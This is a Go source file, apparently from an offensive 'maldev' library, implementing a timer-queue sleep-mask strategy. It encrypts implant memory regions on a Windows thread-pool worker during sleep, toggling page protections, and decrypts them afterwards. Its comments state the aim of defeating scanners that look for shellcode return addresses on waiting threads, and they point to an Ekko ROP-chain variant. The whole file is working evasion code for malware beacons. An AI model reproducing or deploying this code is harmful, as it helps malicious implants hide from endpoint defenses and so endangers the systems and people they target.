//go:build windows

package sleepmask

import (
	"context"
	"fmt"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/win/api"
)

// TimerQueueStrategy is the "L2 light" strategy. The encrypt → wait →
// decrypt cycle runs on a Windows thread-pool worker scheduled via
// CreateTimerQueueTimer; the caller goroutine blocks on an auto-reset
// event until the pool thread signals completion.
//
// Compared to InlineStrategy, the thread doing the actual
// WaitForSingleObject (for the duration d) is a pool worker, not the
// caller. A scanner that flags "thread in Wait whose stack contains
// shellcode return addresses" won't match on the pool thread; the
// caller goroutine is in a different kind of wait (event) whose
// syscall signature differs from Sleep/SleepEx.
//
// This is NOT true Ekko — the caller is still in a kernel wait. For
// the full Ekko experience (beacon thread's RIP inside VirtualProtect
// / SystemFunction032 / WaitForSingleObjectEx via an NtContinue ROP
// chain), use EkkoStrategy.
type TimerQueueStrategy struct{}

// tqState is the struct passed through CreateTimerQueueTimer's context
// parameter to the pool thread callback.
type tqState struct {
	regions []Region
	cipher  Cipher
	key     []byte
	d       time.Duration
	hDummy  windows.Handle // never-signalled event for the pool thread's WaitForSingleObject
	hDone   windows.Handle // auto-reset event: pool thread signals when decrypt is done
	err     error
}

// tqCallbackAddr is the syscall trampoline for tqCallback. Allocated
// once at first use (package-level sync.Once) so we never leak multiple
// trampolines across Cycle calls.
var (
	tqCallbackOnce sync.Once
	tqCallbackAddr uintptr
)

func timerQueueCallbackAddr() uintptr {
	tqCallbackOnce.Do(func() {
		tqCallbackAddr = syscall.NewCallback(tqCallback)
	})
	return tqCallbackAddr
}

// tqCallback runs on a Windows thread-pool worker. It owns the full
// cycle: VirtualProtect(RW) + encrypt + WaitForSingleObject(hDummy, d)
// + decrypt + VirtualProtect(restore). Always signals state.hDone on exit.
func tqCallback(param uintptr, _ uintptr) uintptr {
	state := (*tqState)(unsafe.Pointer(param))
	defer windows.SetEvent(state.hDone) //nolint:errcheck

	origProtect := make([]uint32, len(state.regions))

	// Encrypt phase.
	for i, r := range state.regions {
		if err := windows.VirtualProtect(r.Addr, r.Size, windows.PAGE_READWRITE, &origProtect[i]); err != nil {
			state.err = fmt.Errorf("sleepmask/timerqueue: encrypt protect: %w", err)
			return 0
		}
		state.cipher.Apply(unsafe.Slice((*byte)(unsafe.Pointer(r.Addr)), int(r.Size)), state.key)
	}

	// Wait phase — on the pool thread.
	dms := uint32(state.d / time.Millisecond)
	r1, _, _ := api.ProcWaitForSingleObject.Call(uintptr(state.hDummy), uintptr(dms))
	_ = r1 // WAIT_TIMEOUT (expected, event never fires)

	// Decrypt phase — always.
	for i, r := range state.regions {
		var tmp uint32
		windows.VirtualProtect(r.Addr, r.Size, windows.PAGE_READWRITE, &tmp)
		state.cipher.Apply(unsafe.Slice((*byte)(unsafe.Pointer(r.Addr)), int(r.Size)), state.key)
		windows.VirtualProtect(r.Addr, r.Size, origProtect[i], &tmp)
	}
	return 0
}

// Cycle implements Strategy.
func (s *TimerQueueStrategy) Cycle(ctx context.Context, regions []Region, cipher Cipher, key []byte, d time.Duration) error {
	hDummy, err := windows.CreateEvent(nil, 1 /* manual-reset */, 0, nil)
	if err != nil {
		return fmt.Errorf("sleepmask/timerqueue: CreateEvent dummy: %w", err)
	}
	defer windows.CloseHandle(hDummy)
	hDone, err := windows.CreateEvent(nil, 0 /* auto-reset */, 0, nil)
	if err != nil {
		return fmt.Errorf("sleepmask/timerqueue: CreateEvent done: %w", err)
	}
	defer windows.CloseHandle(hDone)

	state := &tqState{
		regions: regions, cipher: cipher, key: key, d: d,
		hDummy: hDummy, hDone: hDone,
	}

	var hTimer windows.Handle
	const (
		wtExecuteLongFunction = 0x10
		wtExecuteDefault      = 0x0
	)
	r1, _, lastErr := api.ProcCreateTimerQueueTimer.Call(
		uintptr(unsafe.Pointer(&hTimer)),
		0, // NULL queue = default
		timerQueueCallbackAddr(),
		uintptr(unsafe.Pointer(state)),
		0, // DueTime: fire immediately
		0, // Period: one-shot
		wtExecuteLongFunction|wtExecuteDefault,
	)
	if r1 == 0 {
		return fmt.Errorf("sleepmask/timerqueue: CreateTimerQueueTimer: %w", lastErr)
	}

	const invalidHandleValue = ^uintptr(0)
	waitResult, _, _ := api.ProcWaitForSingleObject.Call(uintptr(hDone), uintptr(windows.INFINITE))
	if waitResult != 0 /* WAIT_OBJECT_0 */ {
		api.ProcDeleteTimerQueueTimer.Call(0, uintptr(hTimer), invalidHandleValue)
		return fmt.Errorf("sleepmask/timerqueue: unexpected wait result 0x%x", waitResult)
	}

	api.ProcDeleteTimerQueueTimer.Call(0, uintptr(hTimer), invalidHandleValue)

	if state.err != nil {
		return state.err
	}
	if ctx.Err() != nil {
		return ctx.Err()
	}
	return nil
}
